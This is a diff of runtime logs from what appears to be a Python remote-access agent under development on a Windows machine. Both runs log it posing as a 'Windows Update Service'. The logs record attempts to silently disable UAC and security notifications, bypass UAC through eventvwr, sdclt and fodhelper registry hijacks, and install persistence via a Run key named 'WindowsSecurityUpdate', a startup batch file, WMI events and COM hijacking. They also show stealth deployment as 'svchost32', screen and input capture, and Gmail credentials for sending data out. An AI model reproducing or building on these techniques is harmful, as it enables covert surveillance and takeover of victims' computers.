+[DEBUG] [UAC DISABLE] STARTING SILENT UAC DISABLE
+[DEBUG] [UAC DISABLE] This will DISABLE admin password popups for ALL applications!
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
+[DEBUG] [UAC VERIFY] Current UAC Status:
+[DEBUG]   EnableLUA: 1 (0=Disabled, 1=Enabled)
+[DEBUG]   ConsentPromptBehaviorAdmin: 2
+[DEBUG]     0 = No prompts (DISABLED)
+[DEBUG]     1 = Password required (STRICT)
+[DEBUG]     5 = Just click Yes (CONSENT)
+[DEBUG]   PromptOnSecureDesktop: 1 (0=Off, 1=On)
+[DEBUG]   ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin=2)
+[DEBUG] ================================================================================
+[DEBUG]
+[UAC DISABLE] Trying method 1/4...
+[DEBUG] [UAC DISABLE] Method 1: Direct registry modification...
+[DEBUG] [X] [UAC DISABLE] Method 1 FAILED: [WinError 5] Access is denied
+[DEBUG]
+[UAC DISABLE] Trying method 2/4...
+[DEBUG] [UAC DISABLE] Method 2: reg.exe command...
+[DEBUG] [OK] [UAC DISABLE] Method 2 SUCCESS!
+[DEBUG] [UAC DISABLE] Method 2 succeeded! Verifying...
+[DEBUG]
+[UAC DISABLE] Verifying final status...
+[DEBUG] ================================================================================
+[DEBUG] [UAC VERIFY] Current UAC Status:
+[DEBUG]   EnableLUA: 1 (0=Disabled, 1=Enabled)
+[DEBUG]   ConsentPromptBehaviorAdmin: 2
+[DEBUG]     0 = No prompts (DISABLED)
+[DEBUG]     1 = Password required (STRICT)
+[DEBUG]     5 = Just click Yes (CONSENT)
+[DEBUG]   PromptOnSecureDesktop: 1 (0=Off, 1=On)
+[DEBUG]   ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin=2)
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
+[DEBUG] [X][X][X] [UAC DISABLE] FAILED!
+[DEBUG] [X] Could not disable UAC with any method
+[DEBUG] [X] May need administrator privileges
+[DEBUG] ================================================================================
+[STARTUP] ⚠️ UAC bypass attempt 3 failed
+[STARTUP] ❌ CRITICAL: Could not acquire admin privileges!
+[STARTUP] ⚠️ Security feature disable may be limited without admin rights
+[STARTUP] ℹ️ Agent will continue but some protections may remain active
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[STARTUP] Current admin status: ❌ STANDARD USER
 
 [STARTUP] Step 3: Disabling Windows notifications...
 [INFO] [NOTIFICATIONS] Disabling Windows notifications...
-2025-12-28 06:28:00,467 - INFO - [NOTIFICATIONS] Disabling Windows notifications...
+2026-01-03 08:15:53,496 - INFO - [NOTIFICATIONS] Disabling Windows notifications...
 [INFO] [NOTIFICATIONS] Action Center notifications disabled (HKCU)
-2025-12-28 06:28:00,467 - INFO - [NOTIFICATIONS] Action Center notifications disabled (HKCU)
-[INFO] [NOTIFICATIONS] Notification Center disabled (HKCU)
-2025-12-28 06:28:00,467 - INFO - [NOTIFICATIONS] Notification Center disabled (HKCU)
+2026-01-03 08:15:53,497 - INFO - [NOTIFICATIONS] Action Center notifications disabled (HKCU)
+[INFO] [NOTIFICATIONS] Failed to disable Notification Center (HKCU): [WinError 5] Access is denied
+2026-01-03 08:15:53,498 - INFO - [NOTIFICATIONS] Failed to disable Notification Center (HKCU): [WinError 5] Access is denied
 [INFO] [NOTIFICATIONS] Windows Defender notifications disabled (HKCU)
-2025-12-28 06:28:00,468 - INFO - [NOTIFICATIONS] Windows Defender notifications disabled (HKCU)
+2026-01-03 08:15:53,500 - INFO - [NOTIFICATIONS] Windows Defender notifications disabled (HKCU)
 [INFO] [NOTIFICATIONS] Toast notifications disabled (HKCU)
-2025-12-28 06:28:00,469 - INFO - [NOTIFICATIONS] Toast notifications disabled (HKCU)
-[INFO] [NOTIFICATIONS] Notification Center disabled system-wide (HKLM)
-2025-12-28 06:28:00,470 - INFO - [NOTIFICATIONS] Notification Center disabled system-wide (HKLM)
+2026-01-03 08:15:53,502 - INFO - [NOTIFICATIONS] Toast notifications disabled (HKCU)
+[INFO] [NOTIFICATIONS] No admin privileges for system-wide settings
+2026-01-03 08:15:53,503 - INFO - [NOTIFICATIONS] No admin privileges for system-wide settings
 [INFO] [NOTIFICATIONS] Windows Update notifications disabled
-2025-12-28 06:28:00,470 - INFO - [NOTIFICATIONS] Windows Update notifications disabled
+2026-01-03 08:15:53,504 - INFO - [NOTIFICATIONS] Windows Update notifications disabled
 [INFO] [NOTIFICATIONS] Security notifications disabled
-2025-12-28 06:28:00,471 - INFO - [NOTIFICATIONS] Security notifications disabled
-[INFO] [NOTIFICATIONS] Notification disable completed: 7/7 settings applied
-2025-12-28 06:28:00,472 - INFO - [NOTIFICATIONS] Notification disable completed: 7/7 settings applied
+2026-01-03 08:15:53,506 - INFO - [NOTIFICATIONS] Security notifications disabled
+[INFO] [NOTIFICATIONS] Notification disable completed: 5/7 settings applied
+2026-01-03 08:15:53,507 - INFO - [NOTIFICATIONS] Notification disable completed: 5/7 settings applied
 [STARTUP] ✅ Notifications disabled successfully
 
 ================================================================================
@@ -150,633 +579,497 @@ Hello from the pygame community. https://www.pygame.org/contribute.html
 [STARTUP] FINAL UAC STATUS CHECK:
 [DEBUG] ================================================================================
 [DEBUG] [UAC VERIFY] Current UAC Status:
-[DEBUG]   EnableLUA: 0 (0=Disabled, 1=Enabled)
-[DEBUG]   ConsentPromptBehaviorAdmin: 0
+[DEBUG]   EnableLUA: 1 (0=Disabled, 1=Enabled)
+[DEBUG]   ConsentPromptBehaviorAdmin: 2
 [DEBUG]     0 = No prompts (DISABLED)
 [DEBUG]     1 = Password required (STRICT)
 [DEBUG]     5 = Just click Yes (CONSENT)
-[DEBUG]   PromptOnSecureDesktop: 0 (0=Off, 1=On)
-[DEBUG]   [OK] STATUS: UAC FULLY DISABLED - No admin password popups!
+[DEBUG]   PromptOnSecureDesktop: 1 (0=Off, 1=On)
+[DEBUG]   ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin=2)
 [DEBUG] ================================================================================
 ================================================================================
 [STARTUP] ⚠️ IMPORTANT: RESTART REQUIRED for UAC changes to take full effect!
 ================================================================================
 [INFO] ============================================================
-2025-12-28 06:28:01,873 - INFO - ============================================================
+2026-01-03 08:15:54,560 - INFO - ============================================================
 [INFO] Windows Update Service v2.1
-2025-12-28 06:28:01,874 - INFO - Windows Update Service v2.1
+2026-01-03 08:15:54,561 - INFO - Windows Update Service v2.1
 [INFO] Initializing system components...
-2025-12-28 06:28:01,875 - INFO - Initializing system components...
+2026-01-03 08:15:54,562 - INFO - Initializing system components...
 [INFO] ============================================================
-2025-12-28 06:28:01,876 - INFO - ============================================================
+2026-01-03 08:15:54,563 - INFO - ============================================================
 [INFO] WebRTC Optimization Features:
-2025-12-28 06:28:01,877 - INFO - WebRTC Optimization Features:
+2026-01-03 08:15:54,563 - INFO - WebRTC Optimization Features:
 [INFO]   ✓ Bandwidth estimation & adaptive bitrate control
-2025-12-28 06:28:01,878 - INFO -   ✓ Bandwidth estimation & adaptive bitrate control
+2026-01-03 08:15:54,565 - INFO -   ✓ Bandwidth estimation & adaptive bitrate control
 [INFO]   ✓ Intelligent frame dropping under load
-2025-12-28 06:28:01,879 - INFO -   ✓ Intelligent frame dropping under load
+2026-01-03 08:15:54,566 - INFO -   ✓ Intelligent frame dropping under load
 [INFO]   ✓ Connection quality monitoring & auto-reconnection
-2025-12-28 06:28:01,879 - INFO -   ✓ Connection quality monitoring & auto-reconnection
+2026-01-03 08:15:54,567 - INFO -   ✓ Connection quality monitoring & auto-reconnection
 [INFO]   ✓ Production scale planning (mediasoup migration)
-2025-12-28 06:28:01,879 - INFO -   ✓ Production scale planning (mediasoup migration)
+2026-01-03 08:15:54,568 - INFO -   ✓ Production scale planning (mediasoup migration)
 [INFO]   ✓ Enhanced performance tuning & monitoring
-2025-12-28 06:28:01,880 - INFO -   ✓ Enhanced performance tuning & monitoring
+2026-01-03 08:15:54,569 - INFO -   ✓ Enhanced performance tuning & monitoring
 [INFO] ============================================================
-2025-12-28 06:28:01,880 - INFO - ============================================================
+2026-01-03 08:15:54,570 - INFO - ============================================================
 [STARTUP] Calling main_unified()...
 [WARNING] SHA256 mismatch for GMAIL_USERNAME: expected 9bf243453c355b42fb43ffe4f00f3209546ce85d5cb65aefede18cf728b37c02, got e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
-2025-12-28 06:28:01,887 - WARNING - SHA256 mismatch for GMAIL_USERNAME: expected 9bf243453c355b42fb43ffe4f00f3209546ce85d5cb65aefede18cf728b37c02, got e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+2026-01-03 08:15:54,576 - WARNING - SHA256 mismatch for GMAIL_USERNAME: expected 9bf243453c355b42fb43ffe4f00f3209546ce85d5cb65aefede18cf728b37c02, got e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 [WARNING] SHA256 mismatch for GMAIL_APP_PASSWORD: expected 67944508ba70ca1c01ce9aad2feeee49e9381fa01acc3111bdf38b4b5c413da9, got e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
-2025-12-28 06:28:01,888 - WARNING - SHA256 mismatch for GMAIL_APP_PASSWORD: expected 67944508ba70ca1c01ce9aad2feeee49e9381fa01acc3111bdf38b4b5c413da9, got e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+2026-01-03 08:15:54,577 - WARNING - SHA256 mismatch for GMAIL_APP_PASSWORD: expected 67944508ba70ca1c01ce9aad2feeee49e9381fa01acc3111bdf38b4b5c413da9, got e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 [WARNING] SHA256 mismatch for EMAIL_RECIPIENT: expected 9dcd23d7c1418cc163dd845a3dac654d7541f80d727eadf8d0ee54b2d2d2babb, got e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
-2025-12-28 06:28:01,889 - WARNING - SHA256 mismatch for EMAIL_RECIPIENT: expected 9dcd23d7c1418cc163dd845a3dac654d7541f80d727eadf8d0ee54b2d2d2babb, got e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+2026-01-03 08:15:54,577 - WARNING - SHA256 mismatch for EMAIL_RECIPIENT: expected 9dcd23d7c1418cc163dd845a3dac654d7541f80d727eadf8d0ee54b2d2d2babb, got e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 [INFO] Starting in Agent mode...
-2025-12-28 06:28:01,891 - INFO - Starting in Agent mode...
+2026-01-03 08:15:54,578 - INFO - Starting in Agent mode...
 [INFO] Starting background initialization...
-2025-12-28 06:28:01,892 - INFO - Starting background initialization...
+2026-01-03 08:15:54,579 - INFO - Starting background initialization...
 [DEBUG] ================================================================================
 [DEBUG] [PRIVILEGE ESCALATION] Starting privilege escalation...
 [DEBUG] ================================================================================
 [DEBUG] [PRIVILEGE ESCALATION] Windows detected - checking admin status...
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
 [DEBUG] ================================================================================
-[DEBUG] [OK] [PRIVILEGE ESCALATION] ALREADY ADMIN!
+[DEBUG] [X] [PRIVILEGE ESCALATION] NOT ADMIN - NEED ELEVATION
 [DEBUG] ================================================================================
-[INFO] ✅ Already running as admin!
-2025-12-28 06:28:01,894 - INFO - ✅ Already running as admin!
+[INFO] 🔒 Not running as admin - requesting permission...
+2026-01-03 08:15:54,582 - INFO - 🔒 Not running as admin - requesting permission...
+[DEBUG] [PRIVILEGE ESCALATION] STEP 1: UAC bypass methods
+[INFO] 📋 Attempting UAC bypass methods...
+2026-01-03 08:15:54,583 - INFO - 📋 Attempting UAC bypass methods...
+[DEBUG] [UAC] Calling attempt_uac_bypass()...
+[DEBUG] ================================================================================
+[DEBUG] [UAC BYPASS] attempt_uac_bypass() called
+[DEBUG] ================================================================================
+[DEBUG] [UAC BYPASS] Checking if already admin...
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] [UAC BYPASS] Not admin - starting UAC bypass...
+[INFO] [UAC BYPASS] Starting ADVANCED UAC bypass using UAC Manager...
+2026-01-03 08:15:54,585 - INFO - [UAC BYPASS] Starting ADVANCED UAC bypass using UAC Manager...
+[WARNING] [REGISTRY] PushNotifications policy failed: [WinError 5] Access is denied
+2026-01-03 08:15:54,586 - WARNING - [REGISTRY] PushNotifications policy failed: [WinError 5] Access is denied
+[WARNING] [REGISTRY] WindowsUpdate policy failed: [WinError 5] Access is denied
+2026-01-03 08:15:54,587 - WARNING - [REGISTRY] WindowsUpdate policy failed: [WinError 5] Access is denied
+[WARNING] [REGISTRY] Context menu runas failed: [WinError 5] Access is denied
+2026-01-03 08:15:54,589 - WARNING - [REGISTRY] Context menu runas failed: [WinError 5] Access is denied
+[WARNING] [REGISTRY] Context menu PowershellAdmin failed: [WinError 5] Access is denied
+2026-01-03 08:15:54,590 - WARNING - [REGISTRY] Context menu PowershellAdmin failed: [WinError 5] Access is denied
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[INFO] [REGISTRY] Setting up persistence for: python.exe "C:\Users\Brylle\client.py"
+2026-01-03 08:16:06,836 - INFO - [REGISTRY] Setting up persistence for: python.exe "C:\Users\Brylle\client.py"
+[INFO] [REGISTRY] Attempting to create key: Software\Microsoft\Windows\CurrentVersion\Run
+2026-01-03 08:16:06,839 - INFO - [REGISTRY] Attempting to create key: Software\Microsoft\Windows\CurrentVersion\Run
+[INFO] [REGISTRY] Key created successfully: Software\Microsoft\Windows\CurrentVersion\Run
+2026-01-03 08:16:06,840 - INFO - [REGISTRY] Key created successfully: Software\Microsoft\Windows\CurrentVersion\Run
+[INFO] [REGISTRY] Setting value 'WindowsSecurityUpdate' = 'python.exe "C:\Users\Brylle\client.py"'
+2026-01-03 08:16:06,846 - INFO - [REGISTRY] Setting value 'WindowsSecurityUpdate' = 'python.exe "C:\Users\Brylle\client.py"'
+[INFO] [REGISTRY] Value set successfully in Software\Microsoft\Windows\CurrentVersion\Run
+2026-01-03 08:16:06,847 - INFO - [REGISTRY] Value set successfully in Software\Microsoft\Windows\CurrentVersion\Run
+[INFO] [REGISTRY] Registry persistence setup completed. Success: 1/1 keys
+2026-01-03 08:16:06,848 - INFO - [REGISTRY] Registry persistence setup completed. Success: 1/1 keys
+[INFO] [OK] Startup folder entry created: C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.bat
+2026-01-03 08:16:06,851 - INFO - [OK] Startup folder entry created: C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.bat
+[DEBUG] [UAC BYPASS] Initializing UAC Manager...
+[DEBUG] [OK] [UAC BYPASS] UAC Manager initialized with 9 methods
+[DEBUG] [UAC BYPASS] Calling manager.try_all_methods()...
+[ERROR] Failed to add firewall exception: Command '['netsh', 'advfirewall', 'firewall', 'add', 'rule', 'name=Python Agent 50436807-3840-433a-8d0b-dd901471c338', 'dir=in', 'action=allow', 'program=C:\\Users\\Brylle\\AppData\\Local\\Programs\\Python\\Python313\\python.exe']' returned non-zero exit status 1.
+2026-01-03 08:16:17,496 - ERROR - Failed to add firewall exception: Command '['netsh', 'advfirewall', 'firewall', 'add', 'rule', 'name=Python Agent 50436807-3840-433a-8d0b-dd901471c338', 'dir=in', 'action=allow', 'program=C:\\Users\\Brylle\\AppData\\Local\\Programs\\Python\\Python313\\python.exe']' returned non-zero exit status 1.
+[INFO] [DEBUG] Running as Python script: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+2026-01-03 08:16:17,522 - INFO - [DEBUG] Running as Python script: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+[INFO] [INFO] Deploying to stealth location...
+2026-01-03 08:16:17,523 - INFO - [INFO] Deploying to stealth location...
+[WARNING] [WARN] Cannot deploy Python script as executable - run PyInstaller first
+2026-01-03 08:16:17,526 - WARNING - [WARN] Cannot deploy Python script as executable - run PyInstaller first
+[INFO] [ERROR] Failed to deploy to stealth location: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Local\\Microsoft\\Windows\\svchost32.bat'
+2026-01-03 08:16:17,529 - INFO - [ERROR] Failed to deploy to stealth location: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Local\\Microsoft\\Windows\\svchost32.bat'
+[INFO] [OK] Registry persistence established: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+2026-01-03 08:16:17,531 - INFO - [OK] Registry persistence established: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+[INFO] [DEBUG] Registry entry verified: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+2026-01-03 08:16:17,532 - INFO - [DEBUG] Registry entry verified: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+[INFO] [UAC MANAGER] 9/9 methods available
+2026-01-03 08:16:17,534 - INFO - [UAC MANAGER] 9/9 methods available
+[DEBUG] [UAC MANAGER] Trying 9 UAC bypass methods...
+[INFO] [UAC MANAGER] Trying 9 UAC bypass methods...
+2026-01-03 08:16:17,535 - INFO - [UAC MANAGER] Trying 9 UAC bypass methods...
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 1/9: eventvwr
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 1/9: eventvwr
+2026-01-03 08:16:17,536 - INFO - [UAC MANAGER] Attempt 1/9: eventvwr
+[INFO] [UAC MANAGER] Executing method: Event Viewer
+2026-01-03 08:16:17,536 - INFO - [UAC MANAGER] Executing method: Event Viewer
+[DEBUG]   [METHOD] Checking if Event Viewer is available...
+[DEBUG]   [OK] [METHOD] Event Viewer is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] Event Viewer starting in full debug mode
+2026-01-03 08:16:17,537 - WARNING - [UAC BYPASS DEBUG] Event Viewer starting in full debug mode
+[DEBUG]   [METHOD] Executing Event Viewer (ID: 25)...
+[INFO] [UAC BYPASS] Attempting method: Event Viewer (ID: 25)
+2026-01-03 08:16:17,538 - INFO - [UAC BYPASS] Attempting method: Event Viewer (ID: 25)
+[WARNING] [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\mscfile\shell\open\command
+2026-01-03 08:16:17,558 - WARNING - [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\mscfile\shell\open\command
+[DEBUG]   [X] [METHOD] Event Viewer EXCEPTION: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC BYPASS] Method Event Viewer failed: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:16:17,559 - ERROR - [UAC BYPASS] Method Event Viewer failed: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+[INFO] [OK] Input controllers initialized
+2026-01-03 08:16:28,341 - INFO - [OK] Input controllers initialized
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[INFO] [WARN] TurboJPEG not available, using fallback compression
+2026-01-03 08:16:28,821 - INFO - [WARN] TurboJPEG not available, using fallback compression
+[INFO] [OK] High-performance capture initialized
+2026-01-03 08:16:28,823 - INFO - [OK] High-performance capture initialized
+[ERROR] [UAC MANAGER] Method 'eventvwr' error: Event Viewer failed: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:16:30,206 - ERROR - [UAC MANAGER] Method 'eventvwr' error: Event Viewer failed: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+[DEBUG] [X] [UAC MANAGER] Method 'eventvwr' FAILED
+[INFO] Initialization progress: [====--] 4/6 tasks complete.
+2026-01-03 08:16:30,352 - INFO - Initialization progress: [====--] 4/6 tasks complete.
+[INFO] Low latency input handler started
+2026-01-03 08:16:41,751 - INFO - Low latency input handler started
+[INFO] [OK] Low-latency input handler initialized
+2026-01-03 08:16:41,755 - INFO - [OK] Low-latency input handler initialized
+[INFO] [WARN] Failed to initialize WebRTC components: There is no current event loop in thread 'Thread-43 (task_wrapper)'.
+2026-01-03 08:16:41,765 - INFO - [WARN] Failed to initialize WebRTC components: There is no current event loop in thread 'Thread-43 (task_wrapper)'.
+[INFO] ============================================================
+2026-01-03 08:16:41,773 - INFO - ============================================================
+[INFO] Advanced Python Agent v2.0
+2026-01-03 08:16:41,777 - INFO - Advanced Python Agent v2.0
+[INFO] Starting up...
+2026-01-03 08:16:41,781 - INFO - Starting up...
+[INFO] ============================================================
+2026-01-03 08:16:41,787 - INFO - ============================================================
+[INFO] [INFO] Running from original location - will deploy to stealth location
+2026-01-03 08:16:41,788 - INFO - [INFO] Running from original location - will deploy to stealth location
+[INFO] Checking system requirements...
+2026-01-03 08:16:41,805 - INFO - Checking system requirements...
+[INFO] All critical requirements satisfied
+2026-01-03 08:16:41,811 - INFO - All critical requirements satisfied
+[INFO] Optional features available: Screen capture, Audio processing, Image processing, GUI automation, Input monitoring, OpenCV, NumPy, Speech recognition, WebSockets, Pygame
+2026-01-03 08:16:41,812 - INFO - Optional features available: Screen capture, Audio processing, Image processing, GUI automation, Input monitoring, OpenCV, NumPy, Speech recognition, WebSockets, Pygame
+[INFO] Running on Windows - initializing Windows-specific features...
+2026-01-03 08:16:41,819 - INFO - Running on Windows - initializing Windows-specific features...
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[INFO] [INFO] Not running as administrator. Using basic persistence...
+2026-01-03 08:16:41,827 - INFO - [INFO] Not running as administrator. Using basic persistence...
+[INFO] [REGISTRY] Setting up persistence for: python.exe "C:\Users\Brylle\client.py"
+2026-01-03 08:16:41,836 - INFO - [REGISTRY] Setting up persistence for: python.exe "C:\Users\Brylle\client.py"
+[INFO] [REGISTRY] Attempting to create key: Software\Microsoft\Windows\CurrentVersion\Run
+2026-01-03 08:16:41,843 - INFO - [REGISTRY] Attempting to create key: Software\Microsoft\Windows\CurrentVersion\Run
+[INFO] [REGISTRY] Key created successfully: Software\Microsoft\Windows\CurrentVersion\Run
+2026-01-03 08:16:41,848 - INFO - [REGISTRY] Key created successfully: Software\Microsoft\Windows\CurrentVersion\Run
+[INFO] [REGISTRY] Setting value 'WindowsSecurityUpdate' = 'python.exe "C:\Users\Brylle\client.py"'
+2026-01-03 08:16:41,849 - INFO - [REGISTRY] Setting value 'WindowsSecurityUpdate' = 'python.exe "C:\Users\Brylle\client.py"'
+[INFO] [REGISTRY] Value set successfully in Software\Microsoft\Windows\CurrentVersion\Run
+2026-01-03 08:16:41,858 - INFO - [REGISTRY] Value set successfully in Software\Microsoft\Windows\CurrentVersion\Run
+[INFO] [REGISTRY] Registry persistence setup completed. Success: 1/1 keys
+2026-01-03 08:16:41,864 - INFO - [REGISTRY] Registry persistence setup completed. Success: 1/1 keys
+[INFO] [OK] Startup folder entry created: C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.bat
+2026-01-03 08:16:41,879 - INFO - [OK] Startup folder entry created: C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.bat
+[INFO] Initialization progress: [====--] 4/6 tasks complete..
+2026-01-03 08:16:42,565 - INFO - Initialization progress: [====--] 4/6 tasks complete..
+[INFO] [OK] WMI event persistence established
+2026-01-03 08:16:42,646 - INFO - [OK] WMI event persistence established
+[INFO] [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
+2026-01-03 08:16:42,658 - INFO - [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
+[INFO] [SKIP] Watchdog persistence disabled to prevent popup windows
+2026-01-03 08:16:42,661 - INFO - [SKIP] Watchdog persistence disabled to prevent popup windows
+[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+2026-01-03 08:16:42,676 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+2026-01-03 08:16:42,680 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+2026-01-03 08:16:42,689 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+[INFO] [SKIP] Tamper protection disabled to prevent popup windows
+2026-01-03 08:16:42,690 - INFO - [SKIP] Tamper protection disabled to prevent popup windows
+[INFO] Background initialization complete
+2026-01-03 08:16:42,693 - INFO - Background initialization complete
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 2/9: sdclt
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 2/9: sdclt
+2026-01-03 08:16:42,695 - INFO - [UAC MANAGER] Attempt 2/9: sdclt
+[INFO] [UAC MANAGER] Executing method: Sdclt
+2026-01-03 08:16:42,699 - INFO - [UAC MANAGER] Executing method: Sdclt
+[DEBUG]   [METHOD] Checking if Sdclt is available...
+[DEBUG]   [OK] [METHOD] Sdclt is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] Sdclt starting in full debug mode
+2026-01-03 08:16:42,712 - WARNING - [UAC BYPASS DEBUG] Sdclt starting in full debug mode
+[DEBUG]   [METHOD] Executing Sdclt (ID: 31)...
+[INFO] [UAC BYPASS] Attempting method: Sdclt (ID: 31)
+2026-01-03 08:16:42,715 - INFO - [UAC BYPASS] Attempting method: Sdclt (ID: 31)
+[WARNING] [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\Folder\shell\open\command
+2026-01-03 08:16:42,970 - WARNING - [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\Folder\shell\open\command
+[DEBUG]   [X] [METHOD] Sdclt EXCEPTION: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC BYPASS] Method Sdclt failed: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:16:42,974 - ERROR - [UAC BYPASS] Method Sdclt failed: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+[INFO] Initialization complete! All 6 tasks finished.
+2026-01-03 08:16:53,172 - INFO - Initialization complete! All 6 tasks finished.
+[ERROR] [UAC MANAGER] Method 'sdclt' error: Sdclt failed: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:16:53,177 - ERROR - [UAC MANAGER] Method 'sdclt' error: Sdclt failed: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+[DEBUG] [X] [UAC MANAGER] Method 'sdclt' FAILED
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 3/9: fodhelper
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 3/9: fodhelper
+2026-01-03 08:17:06,155 - INFO - [UAC MANAGER] Attempt 3/9: fodhelper
+[INFO] [UAC MANAGER] Executing method: Fodhelper Protocol
+2026-01-03 08:17:06,156 - INFO - [UAC MANAGER] Executing method: Fodhelper Protocol
+[DEBUG]   [METHOD] Checking if Fodhelper Protocol is available...
+[DEBUG]   [OK] [METHOD] Fodhelper Protocol is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] Fodhelper Protocol starting in full debug mode
+2026-01-03 08:17:06,162 - WARNING - [UAC BYPASS DEBUG] Fodhelper Protocol starting in full debug mode
+[DEBUG]   [METHOD] Executing Fodhelper Protocol (ID: 33)...
+[INFO] [UAC BYPASS] Attempting method: Fodhelper Protocol (ID: 33)
+2026-01-03 08:17:06,164 - INFO - [UAC BYPASS] Attempting method: Fodhelper Protocol (ID: 33)
+[WARNING] [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\ms-settings\Shell\Open\command
+2026-01-03 08:17:06,202 - WARNING - [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\ms-settings\Shell\Open\command
+[DEBUG]   [X] [METHOD] Fodhelper Protocol EXCEPTION: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC BYPASS] Method Fodhelper Protocol failed: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:17:06,202 - ERROR - [UAC BYPASS] Method Fodhelper Protocol failed: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+[INFO] [OK] WMI event persistence established
+2026-01-03 08:17:17,129 - INFO - [OK] WMI event persistence established
+[INFO] [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
+2026-01-03 08:17:17,130 - INFO - [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
+[INFO] [SKIP] Watchdog persistence disabled to prevent popup windows
+2026-01-03 08:17:17,131 - INFO - [SKIP] Watchdog persistence disabled to prevent popup windows
